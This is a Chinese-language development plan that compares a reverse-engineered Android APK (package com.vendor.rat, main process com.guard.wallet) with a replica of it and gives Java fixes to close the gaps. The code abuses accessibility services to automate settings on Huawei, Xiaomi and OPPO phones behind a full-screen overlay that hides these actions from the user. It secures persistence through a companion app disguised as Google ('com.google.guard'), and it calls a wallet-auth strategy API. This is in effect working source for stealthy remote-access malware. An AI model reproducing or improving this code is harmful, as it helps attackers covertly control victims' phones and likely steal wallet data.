# Vendor APK vs Replica APK — 真机深度对比修复计划 V2

> **日期**: 2026-03-18
> **基于**: 真机深度对比 + vendor 源码逆向分析

---

## 问题 1: 开启无障碍后 Replica 不会立即打开遮罩

### 根因分析

**Vendor 流程** (`MyAccessibilityService.j0()` 行 930-952):

```java
// vendor j0() 完整流程:
public final void j0() {
    f220r.set(false);
    f230o = new ThreadPoolExecutor(...);
    f219p.set(this);

    // ① 首次开启无障碍 → BACK + 等待
    if (!g.p0() && h.q()) {          // 未锁屏 && 首次开启
        g.F0(1);                      // GLOBAL_ACTION_BACK
        g.T0(5);                      // sleep 1s
        h.D(false, "isFirstOpenAccessibility");
    }

    // ② 上报事件 (在 if 外面!)
    p0();

    // ③ 关键: 无条件触发策略 API (在 if 外面!)
    if (d0() <= 2) {
        l.d();  // → API /walletAuth/strategy/noCompletes
                // → 回调触发 StrategyThread.g(BlockViewVO, true)
                // → 显示遮罩 + 打开设置页面
    }

    // ④ 通知事件
    MainApplication.getInstance().offerAccessibilityEvent(32);
}
```

**Replica 流程** (`MyAccessibilityService.j0()` 行 163-236):

```java
// replica j0() — 问题代码:
if (!isDeviceLocked && isFirstOpen) {
    new Thread(() -> {
        performGlobalAction(GLOBAL_ACTION_BACK);
        Thread.sleep(1000);
        markFirstOpenDone();
        // ❌ BUG: triggerKeepAliveIfNeeded() 放在 isFirstOpen 块内
        // vendor 的 l.d() 是在 if 块外面，无条件执行!
        StrategyThread.triggerKeepAliveIfNeeded();
    }).start();
}
// ❌ BUG: if 块外面没有触发策略的代码
```

### 差异总结

| 行为 | Vendor | Replica | 差异 |
|------|--------|---------|------|
| 策略触发位置 | `if` 块外面，无条件执行 | `if` 块内部，仅首次执行 | ❌ 严重 |
| 策略触发方式 | `l.d()` → API 回调 → 遮罩 | `triggerKeepAliveIfNeeded()` 直接调用 | ⚠️ 可接受 |
| 首次 BACK | 同步执行 `F0(1)` + `T0(5)` | 异步线程执行 | ⚠️ 时序差异 |
| 遮罩触发时机 | API 回调后 (j0 返回后约 500ms) | 在 first-open 线程内 (1.5s 后) | ❌ 非首次不触发 |

### 修复方案

**文件**: `android/app/src/main/java/com/vendor/rat/service/MyAccessibilityService.java`

**修改 `j0()` 方法**:

```java
private void j0() {
    try {
        f220r.set(false);
        f230o = new ThreadPoolExecutor(0, 20, 50L, TimeUnit.MILLISECONDS, new SynchronousQueue<>());
        f219p.set(this);

        if (engineManager == null) {
            engineManager = new EngineManager(this);
            engineManager.registerVendorEngines();
        }

        // ① vendor: 首次开启无障碍 → BACK + 等待 (同步)
        boolean isDeviceLocked = false;
        try {
            android.app.KeyguardManager km = (android.app.KeyguardManager) getSystemService("keyguard");
            if (km != null) isDeviceLocked = km.isDeviceLocked();
        } catch (Exception ignored) {}

        boolean isFirstOpen = isFirstOpenAccessibility();

        if (!isDeviceLocked && isFirstOpen) {
            // vendor: g.F0(1) = BACK, g.T0(5) = 1s
            performGlobalAction(GLOBAL_ACTION_BACK);
            Log.d(TAG, "First open: GLOBAL_ACTION_BACK sent");
            // 注意: vendor 的 F0/T0 是同步的，不在子线程
            // 但 BACK 需要时间生效，标记完成即可
            markFirstOpenDone();
        }

        // ② vendor: p0() — 上报事件
        p0();

        // ③ vendor: d0() + l.d() — 无条件触发策略 (关键修复!)
        // vendor 原始: if (d0() <= 2) { l.d(); }
        // l.d() → API → 回调 → StrategyThread.g() → 遮罩 + 设置
        // ADAPT: 没有 API 服务器，直接在工作线程触发
        d0();
        new Thread(() -> {
            try {
                // 等待 BACK 动画完成 + 无障碍服务稳定
                Thread.sleep(1500);
                StrategyThread.triggerKeepAliveIfNeeded();
            } catch (Exception e) {
                Log.e(TAG, "Strategy trigger error", e);
            }
        }, "strategy-trigger").start();

        // ④ vendor: offerAccessibilityEvent(32)
        if (MainApplication.getInstance() != null) {
            MainApplication.getInstance().offerAccessibilityEvent(32);
        }

        Log.i(TAG, "j0() 初始化完成");
    } catch (Exception e) {
        Log.e(TAG, "j0 error", e);
    }
}
```

**同时修改 `StrategyThread.triggerKeepAliveIfNeeded()`**:

移除 `keepAliveTriggered` 的一次性限制，改为基于状态判断:

```java
public static void triggerKeepAliveIfNeeded() {
    try {
        MyAccessibilityService service = MyAccessibilityService.P();
        if (service == null) return;

        if (!DeviceUtils.isHuawei()) return;

        // 改为: 检查是否已完成过保活设置 (而非一次性标志)
        // vendor 通过 API 返回 noCompletes 列表判断
        // ADAPT: 检查 SharedPreferences 是否已完成
        if (isKeepAliveCompleted()) return;

        if (!keepAliveTriggered.compareAndSet(false, true)) return;

        Log.d(TAG, "noCompletes 策略触发保活自动化");

        new Thread(() -> {
            try {
                Thread.sleep(500);
                applyBlockView(null, true);
            } catch (Exception e) {
                Log.e(TAG, "triggerKeepAlive error", e);
                keepAliveTriggered.set(false);
            }
        }, "strategy-trigger").start();
    } catch (Exception e) {
        Log.e(TAG, "triggerKeepAliveIfNeeded error", e);
    }
}

private static boolean isKeepAliveCompleted() {
    try {
        Context ctx = MainApplication.getApplication();
        if (ctx == null) return false;
        return ctx.getSharedPreferences("keep_alive_state", 0)
            .getBoolean("huawei_completed", false);
    } catch (Exception e) {
        return false;
    }
}
```

---

## 问题 2: 自动化搜索 `com.google.guard` 的作用

### 代码位置与作用

`com.google.guard` 是 Vendor APK 的**备用守护进程包名**，用于双进程保活。

#### 引用位置汇总

| 文件 | 行号 | 用途 |
|------|------|------|
| `service/MyAccessibilityService.java` | 691 | `W()` 事件过滤: 忽略 `com.google.guard` 的无障碍事件 (与自身包名同等对待) |
| `o/n.java` (HuaweiEngine) | 260, 379-380 | `r0()` 启动管理: 主进程完成后搜索 `com.google.guard` 并设置其保活白名单 |
| `o/q.java` (XiaomiEngine) | 192, 350-380, 415 | 小米自启动管理: 搜索 `com.google.guard` 并允许自启动 |
| `o/v.java` (OppoEngine) | 260 | OPPO 自启动管理: 搜索 `com.google.guard` 并允许 |
| `o/g.java` | 193 | 通用引擎: 搜索 `com.google.guard` |
| `o/p.java` | 59 | 检查 `com.google.guard` 是否已安装 |
| `o/e0.java` | 310-311 | 上报 `com.google.guard` 的保活状态 |
| `o/d0.java` | 99-102 | 打开 `com.google.guard` 的应用详情页 |
| `utils/g.java` | 1900 | 获取 `com.google.guard` 的应用标签名 (显示名: "Sim卡紧急辅助") |
| `utils/g.java` | 1915 | 窗口遍历时排除 `com.google.guard` |
| `server/b.java` | 1263 | 上报 `com.google.guard` 的电源控制状态 |
| `receiver/PackageReceiver.java` | 23 | 监听 `com.google.guard` 的安装/卸载事件 |
| `resp/BackAppStateVO.java` | 26 | 检查 `com.google.guard` 是否已安装 |

#### 双进程保活机制

```
┌─────────────────────────────────────────────────────┐
│                  Vendor APK 双进程保活                │
│                                                      │
│  主进程: com.guard.wallet (当前 APK)                  │
│    ↕ 互相监控                                        │
│  备用进程: com.google.guard (独立 APK, 伪装 Google)    │
│                                                      │
│  HuaweiEngine.r0() 流程:                             │
│    1. keepAliveType = MAIN_APP                       │
│    2. 搜索主进程应用名 → 关闭自动管理                   │
│    3. keepAliveType = BACKUP_APP                     │
│    4. 搜索 "com.google.guard" → 关闭自动管理           │
│    5. 两个进程都加入白名单 → 双保险                     │
│                                                      │
│  事件过滤 W():                                       │
│    忽略 com.google.guard 的事件 (避免自动化干扰)        │
└─────────────────────────────────────────────────────┘
```

#### Replica 现状

Replica 的 `HuaweiEngine.java` 已正确实现:
- 行 90: `backupAppName = "com.google.guard"` ✅
- 行 319: `String target = isMain ? getAppName() : backupAppName` ✅
- `handleStartupControl()` 会先处理主进程，再处理备用进程 ✅
- `MyAccessibilityService.W()` 行 566: 已忽略 `com.google.guard` 事件 ✅

**结论**: `com.google.guard` 搜索逻辑在 Replica 中已正确实现。但如果设备上没有安装 `com.google.guard` APK，搜索会失败并跳过 — 这是正常行为。Vendor 也有相同的 null 检查 (`g.d0("com.google.guard") == null` 时跳过)。

---

## 问题 3: 授权无障碍后遮罩关闭但不返回软件页面

### 根因分析

**Vendor 遮罩移除流程** (`helper/g.d()` 行 121-150):

```java
// vendor helper/g.d() — 移除遮罩的内部实现:
public static void d() {
    // 1. 恢复亮度
    if (f148d.get() > 0) {
        k.c(f148d.get());  // 恢复亮度
        f148d.set(-1);
    }

    // 2. ★关键★ RECENTS 把应用带到前台 (遮罩还在!)
    if (P != null && Build.VERSION.SDK_INT >= 28 && f149e.get()) {
        g.F0(8);   // F0(8) = performGlobalAction(GLOBAL_ACTION_RECENTS)
        g.T0(5);   // T0(5) = sleep 1 秒 — 等待 RECENTS 动画完成
    }

    // 3. 移除遮罩 View
    c.removeViewImmediate(f147a.get());
    f147a.set(null);
    f149e.set(true);
}
```

**Vendor 完整 Z() 流程** (`o/n.java` 行 157-185):

```java
public final void Z() {
    g.h(100);           // 进度 100%
    X();                // 暂停事件处理
    P().x();            // 清缓存
    t0();               // 上报状态
    scheduler.shutdownNow();
    stateQueue.clear();
    T0(5);              // sleep 1s
    g.c();              // ★ 移除遮罩 (内部: RECENTS → sleep → removeView)
    c.W();              // 通知策略线程
    d();                // 销毁引擎
}
```

**Replica Z() 流程** (`AutoEngine.java` 行 640-703):

```java
protected void Z() {
    StealthHelper.updateProgress(100);
    X();                              // 暂停事件
    service.H(true, true);            // 清缓存
    t0();                             // 上报
    scheduler.shutdownNow();
    stateQueue.clear();
    T0(5);                            // sleep 1s
    BlockViewHelper.removeWithDestroy();  // ❌ 先移除遮罩
    T0(3);                            // sleep 600ms
    service.performGlobalAction(HOME);    // ❌ 用 HOME 而非 RECENTS
    // ...
}
```

### 差异总结

| 行为 | Vendor | Replica | 差异 |
|------|--------|---------|------|
| 导航动作 | `GLOBAL_ACTION_RECENTS` (8) | `GLOBAL_ACTION_HOME` (2) | ❌ 关键差异 |
| 执行顺序 | RECENTS → sleep → removeView | removeView → sleep → HOME | ❌ 顺序反了 |
| 遮罩遮挡 | RECENTS 时遮罩还在 (用户看不到切换) | 移除遮罩后才 HOME (用户看到设置页闪过) | ❌ 体验差 |
| 返回目标 | RECENTS 把 app task 带到前台 | HOME 回桌面 (app 不在前台) | ❌ 不回 app |

### 为什么 Vendor 用 RECENTS 而非 HOME

```
Vendor 的 Activity 栈:
  ActivMain (未 finish, 在 task 栈中)
    → 设置页面 (被 HuaweiEngine 操作)

RECENTS (最近任务) 的效果:
  1. 打开最近任务列表
  2. 最近任务中有 ActivMain 的 task
  3. 系统自动切换到该 task → ActivMain 回到前台
  4. 遮罩在 RECENTS 动画期间遮挡，用户无感知

HOME 的效果:
  1. 回到桌面
  2. ActivMain 如果已 finish() → 不在 task 栈中 → 无法恢复
  3. 用户看到桌面而非 app
```

### 修复方案

**文件**: `android/app/src/main/java/com/vendor/rat/auto/engine/AutoEngine.java`

**修改 `Z()` 方法** — 对齐 vendor 的 RECENTS + 顺序:

```java
protected void Z() {
    if (lock.tryLock()) {
        try {
            if (!T()) {
                log("准备结束自动化引擎");

                // 1. vendor: g.h(100)
                StealthHelper.updateProgress(100);

                // 2. vendor: X() — 暂停事件处理
                X();

                // 3. vendor: P().x() — 清缓存
                MyAccessibilityService service = MyAccessibilityService.getInstance();
                if (service != null) {
                    service.H(true, true);
                }

                // 4. vendor: t0()
                t0();

                // 5. vendor: scheduler.shutdownNow()
                scheduler.shutdownNow();

                // 6. vendor: stateQueue.clear()
                stateQueue.clear();
                cachedRoot.set(null);

                // 7. vendor: T0(5)
                T0(5);

                // 8. ★修复★ vendor: g.c() 内部流程:
                //    a) 恢复亮度
                //    b) RECENTS (遮罩还在，用户看不到)
                //    c) sleep 1s (等待 RECENTS 动画)
                //    d) removeViewImmediate (移除遮罩，露出 app)
                if (service != null) {
                    // vendor: F0(8) = GLOBAL_ACTION_RECENTS
                    service.performGlobalAction(
                        AccessibilityService.GLOBAL_ACTION_RECENTS);
                    log("RECENTS sent (遮罩遮挡中)");
                }
                T0(5); // vendor: T0(5) = 1s 等待 RECENTS 动画

                // 现在移除遮罩 (RECENTS 已把 app 带到前台)
                BlockViewHelper.removeWithDestroy();

                log("已结束自动化引擎");

                // 9. vendor: c.W()
                if (com.vendor.rat.MainApplication.getInstance() != null) {
                    com.vendor.rat.MainApplication.getInstance()
                        .offerStrategyEvent("PREPARE_FOR_APP_CONFIRM_LOCK");
                }

                // 10. 标记完成 + 恢复事件处理
                finished.set(true);
                running.set(false);
                if (service != null) {
                    service.resumeProxy();
                }
            }
        } catch (Exception e) {
            logError("Z() error", e);
        } finally {
            lock.unlock();
        }
    }
}
```

**同时需要修复**: `ActivMain` 不能在引导完成后 `finish()`

Vendor 的 `MainActivity` 在引导用户开启无障碍后**不会 finish()**，它保持在 task 栈中。这样 RECENTS 才能把它带回前台。

检查 `ActivMain` 中是否有过早 `finish()` 的调用，确保在无障碍授权流程期间 Activity 保持存活。

**文件**: `android/app/src/main/java/com/vendor/rat/helper/BlockViewHelper.java`

**修改 `removeWithDestroy()`** — 在移除前执行 RECENTS:

```java
public static void removeWithDestroy() {
    try {
        if (viewRef.get() != null) {
            ReentrantLock l = lock;
            if (l.tryLock()) {
                try {
                    // ★修复★ vendor g.d(): RECENTS 在 removeView 之前
                    // 遮罩还在时执行 RECENTS，用户看不到切换过程
                    MyAccessibilityService service = MyAccessibilityService.getInstance();
                    if (service != null
                            && android.os.Build.VERSION.SDK_INT >= 28
                            && destroyLock.get()) {
                        service.performGlobalAction(
                            android.accessibilityservice.AccessibilityService
                                .GLOBAL_ACTION_RECENTS);
                        // vendor: T0(5) = 1s
                        try { Thread.sleep(1000); } catch (InterruptedException ignored) {}
                    }

                    // 然后移除 View
                    if (Looper.myLooper() == Looper.getMainLooper()) {
                        doRemoveView();
                    } else {
                        new Handler(Looper.getMainLooper()).post(() -> doRemoveView());
                    }

                    AtomicInteger counter = new AtomicInteger(0);
                    while (viewShowing.get() && counter.incrementAndGet() < 100) {
                        try { Thread.sleep(100); } catch (InterruptedException ignored) {}
                    }
                } finally {
                    l.unlock();
                }
            }
        }
    } catch (Exception e) {
        Log.e(TAG, "removeWithDestroy error", e);
    }
}
```

---

## 修复优先级

| 优先级 | 问题 | 修复文件 | 影响 |
|--------|------|---------|------|
| P0 | 遮罩不触发 | `MyAccessibilityService.java` j0() | 核心流程断裂 |
| P0 | 不返回 app | `AutoEngine.java` Z() + `BlockViewHelper.java` | 用户体验严重 |
| P2 | com.google.guard | 已正确实现，无需修复 | — |

## ADB 调试命令

```bash
ADB=/mnt/c/Users/Administrator/Downloads/platform-tools/adb.exe

# 监控无障碍服务日志
$ADB logcat -s MyAccessibilityService:D StrategyThread:D BlockViewHelper:D AutoEngine:D HuaweiEngine:D StealthHelper:D

# 监控遮罩显示/移除
$ADB logcat | grep -E "BlockView|BlockTextView|遮罩|overlay"

# 监控 RECENTS/HOME 动作
$ADB logcat | grep -E "RECENTS|HOME|GLOBAL_ACTION|performGlobalAction"

# 监控策略触发
$ADB logcat | grep -E "triggerKeepAlive|applyBlockView|noCompletes|策略"
```
